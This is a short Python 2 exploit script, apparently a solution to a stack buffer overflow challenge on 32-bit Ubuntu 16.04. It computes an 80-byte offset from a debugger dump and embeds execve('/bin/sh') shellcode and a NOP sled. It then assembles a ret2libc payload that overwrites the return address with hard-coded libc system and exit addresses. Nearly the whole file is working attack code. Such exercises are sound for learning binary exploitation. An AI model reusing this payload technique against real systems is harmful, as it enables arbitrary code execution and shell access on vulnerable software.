#!/usr/bin/python

#Tested on Ubuntu 16.04

offset=80

#offset is calculated at 80, after supplying a payload of size 300 to the stack variable
#this challenge arranges the stack in a weird way 
#padding="A"*offset
padding=""
#Alphabetic sequence payload. 4A's 4B's.......(20 letters) 20x4=80 our offset



'''
Sequence of 4's in stack.
bffe:301c|41414141|AAAA|
bffe:3020|42424242|BBBB|
bffe:3024|43434343|CCCC|
bffe:3028|44444444|DDDD|
bffe:302c|45454545|EEEE|
bffe:3030|46464646|FFFF|
bffe:3034|47474747|GGGG|
bffe:3038|48484848|HHHH|
bffe:303c|49494949|IIII|
bffe:3040|4a4a4a4a|JJJJ|
bffe:3044|4b4b4b4b|KKKK|
bffe:3048|4c4c4c4c|LLLL|
bffe:304c|4d4d4d4d|MMMM|
bffe:3050|4e4e4e4e|NNNN|
bffe:3054|4f4f4f4f|OOOO|
bffe:3058|50505050|PPPP|
bffe:305c|25252525|%%%%|
bffe:3060|52525252|RRRR|
bffe:3064|53535353|SSSS|
bffe:3068|54545454|TTTT|
bffe:306c|25252525|%%%%|

'''
#Note that eip gets filled twice, Sequence of Q's has been overwritten. The last eip is the intended address.

# Exploit attempt-1 : padding + eip + nopsled + shellcode
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

for i in range(20):
    padding+=chr(65+i)*4

nopsled="\x90"*100
#bffe:3070-middle of nop sled

##b7ee4c06 libc syscall 0xb7e3cdb0
eip="\xb0\xcd\xe3\xb7"

## arg1="exit()" #ret address b766b8bf
## b7 ff 3c 0b
exitaddr="\x0b\x3c\xff\xb7"

##0x00000000 bf ff f3 7a
##="0x00000000b7f5db0b"
arg1="\x7b\xf3\xff\xbf"
#arg1="\x5c\x5c\x68\x73\x61\x62\x5c\x5c\x6e\x69\x62\x5c\x5c"

exploit=padding+eip+exitaddr+arg1+"\x00"

print exploit

